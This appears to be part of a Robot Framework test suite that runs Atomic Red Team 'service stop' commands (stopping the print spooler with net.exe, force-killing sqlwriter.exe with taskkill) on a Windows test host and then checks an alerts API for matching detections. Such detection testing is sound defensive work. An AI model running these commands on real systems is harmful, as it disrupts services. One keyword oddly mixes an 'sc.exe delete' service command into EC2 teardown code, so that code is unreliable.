   ${Status}=  Loop over range_ten   @{range}  ${target_n}
   Should Be Equal  success  ${Status}
Get Responses of target_name Service Stop_119
   [Documentation]  The responses of  Windows - Stop service using net.exe_2  Rule Name:service stop --pass-1/1
   [Tags]  Red Canary Atomic T1489  Impact
   ${cmd_names}  Set Variable  net.exe stop spooler
   ${target_n}  Set Variable  net.exe
   do_ssh  ${windows_host_ip}  pass  ${cmd_names}
   ${Status}=  Loop over range_ten   @{range}  ${target_n}
   Should Be Equal  success  ${Status}
Get Responses of target_name Service Stop_120
   [Documentation]  The responses of  Windows - Stop service by killing process_3  Rule Name:service stop --pass-1/1
   [Tags]  Red Canary Atomic T1489  Impact
   ${cmd_names}  Set Variable  taskkill.exe /f /im sqlwriter.exe
   ${target_n}  Set Variable  taskkill.exe
   do_ssh  ${windows_host_ip}  pass  ${cmd_names}
   ${Status}=  Loop over range_ten   @{range}  ${target_n}
   Should Be Equal  success  ${Status}
#Terminate AWS EC2 Instance of Agent Windows Machine
#   [Documentation]  Terminats the EC2 instances of Server Ubuntu Host
#   [Tags]  Tear Down
#   ${Result}=  TERMINATE EC2 INSTANCE  ${Instance_id_node_windows}
#   Log  ${Result}
#
#Terminate AWS EC2 Instance of Server Ubuntu Host
#   [Documentation]  Terminats the EC2 instances of Server Ubuntu Host
#   [Tags]  Tear Down
#   ${Result}=  TERMINATE EC2 INSTANCE  ${Instance_id_server}
#   Log  ${Result}


*** Keywords ***
CREATE INSTANCE
	[Arguments]  ${Image_id}  ${instance_type}  ${key_pair}  ${BlockDeviceMappings}  ${tag_list}  ${NetworkInterfaces}    
	${Instance}=  call_EC2  ${Image_id}  ${instance_type}  ${key_pair}  ${BlockDeviceMappings}  ${tag_list}  ${NetworkInterfaces}
	[Return]  ${Instance.create_instance()}

TERMINATE EC2 INSTANCE
	[Arguments]  ${Instance_id}
	sc.exe  delete ARTService${Result}  Terminate_instance  ${Instance_id}
	[Return]  ${Result}

CONNECT API POST
    [Arguments]  ${endpoint}  ${data}  ${token}
    Log  ${data}
    ${obj}  apitest  ${server_ip}   ${endpoint}  ${data}  ${token}
    [Return]  ${obj.test_connection()}

Genearte Alerts
  [Arguments]  ${command}
  Log to Console  ${command}
  ${result}=  windows_ssh_object  ${windows_host_ip}  ${server_ip}  pass  ${command}
  [Return]  ${result.alerts()}

Get x-token
   ${token}=  get_token  ${server_ip}
   [Return]  ${token}

Validate Alert
   [Arguments]  ${command}
   Log  ${command}
   ${alert_result}=  Genearte Alerts  ${command}
   Sleep  60s
   #${data}=  Alerts  ${Host_id['windows']}[0]
   ${data}  Alerts  EC20ECBF-83DF-014A-3212-A10805A94CFE
   ${token}=  Get x-token
   ${result}=  Validate_alerts_data   ${command}   ${server_ip}   /alerts  ${data}  ${token}
   [Return]  ${result}

CONNECT API
        [Arguments]  ${base_url}  ${endpoint}  ${token}
        ${API_object}=  call_API   ${base_url}  ${endpoint}  ${token}
        [Return]  ${API_object.connect_API()}

Loop over range_ten
    [Arguments]  @{range}  
    :FOR  ${item}  IN  @{range} 
    \  Sleep  30s
    \  ${Status}  Set Variable  failure
    \  Set Global variable  ${Status} 
    \  ${token}=  Get x-token 
#   \  ${alerts}=  get_alerts_data   ${base_url}  ${token}  ${Host_id['windows']}[0]
    \	${alerts}=  get_alerts_data   ${base_url}  ${token}  EC20ECBF-83DF-014A-3212-A10805A94CFE
    \  Log   ${alerts}
    \  ${alerts_data}=  last_two_min_data  ${alerts}
    \  Log  ${alerts_data}
    \  ${length}=  Get Length  ${alerts_data}
    \  Log  ${length}
    \  Continue For Loop If  ${length}<0
    \	   ${Status} =  validate  ${alerts_data}  ${target_n}   
    \  	   Exit For Loop If  "${Status}" =="success"	   	
    [Return]   ${Status}

   
Loop for do_ssh
   [Arguments]  @{cmd_names}
   :FOR  ${cmd_name}  IN  @{cmd_names}
   \  do_ssh  ${windows_host_ip}  pass  ${cmd_name}
